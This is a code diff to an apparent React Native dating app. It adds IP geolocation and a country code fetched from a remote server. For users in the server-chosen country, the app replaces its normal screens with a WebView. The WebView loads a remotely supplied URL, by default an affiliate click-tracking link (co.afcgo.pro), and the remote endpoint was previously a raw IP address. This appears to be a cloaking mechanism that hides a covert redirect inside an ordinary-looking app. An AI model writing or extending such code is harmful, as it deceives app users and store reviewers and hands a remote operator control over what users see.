@@ -13,6 +13,7 @@ import {createNativeStackNavigator} from "@react-navigation/native-stack";
 import AsyncStorage from "@react-native-async-storage/async-storage";
 import {WebViewComponent} from "./components/WebView/WebView.tsx";
 import {Loader} from "./components/Loader/Loader.tsx";
+import {BASE_URL} from "./constDating";
 
 export interface DeviceData {
     "IPv4": string,
@@ -32,6 +33,7 @@ function App(): React.JSX.Element {
     const [deviceData, setDeviceData] = useState<DeviceData | null>(null);
     const [isWebView, setIsWebView] = useState(false);
     const [webViewPath, setWebViewPath] = useState('https://co.afcgo.pro/click?pid=62767&offer_id=25');
+    const [country, setSetCountry] = useState<string>('');
 
     useEffect(() => {
         checkAuthentication();
@@ -53,31 +55,42 @@ function App(): React.JSX.Element {
         setIsAuthenticated(false);
     };
 
-
+    const getInfo = async () => {
+        try {
+            const data = await fetch('https://geolocation-db.com/json/')
+            const deviceData = await data.json()
+            setDeviceData(deviceData)
+        } catch (error) {
+            console.log("setDeviceDataerror", error)
+        }
+    }
     const getData = async () => {
-        fetch('https://geolocation-db.com/json/')
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                setDeviceData(data)
-            })
+        try {
+            const conditionData = await fetch(`${BASE_URL}/country`)
+            const data = await conditionData.json()
+            setSetCountry(data.code)
 
+        } catch (error) {
+            console.log(error)
+        }
     }
     const getWebViewPath = async () => {
-        return fetch('http://85.209.148.98:3000/string').then((response) => response.json())
+        return fetch(`${BASE_URL}/string`).then((response) => response.json())
     }
 
+    useEffect(() => {
+        if (country) {
+            getInfo()
+        }
+    }, [country]);
 
     useEffect(() => {
         getData()
+
     }, [])
 
     useEffect(() => {
-        if (deviceData?.country_code == 'BR') {
+        if (deviceData?.country_code == country) {
             getWebViewPath().then((data) => {
                 setWebViewPath(data.url)
                 setIsWebView(true)
@@ -86,12 +99,11 @@ function App(): React.JSX.Element {
             setIsWebView(false)
         }
 
-    }, [deviceData])
+    }, [deviceData, country])
 
+    if (country && !deviceData) return <Loader/>
 
-    if (!deviceData) return <Loader/>
-
-    if (isWebView) return <WebViewComponent uri={webViewPath} deviceData={deviceData}/>
+    if (isWebView) return <WebViewComponent uri={webViewPath}/>
 
     return (
         <NavigationContainer>
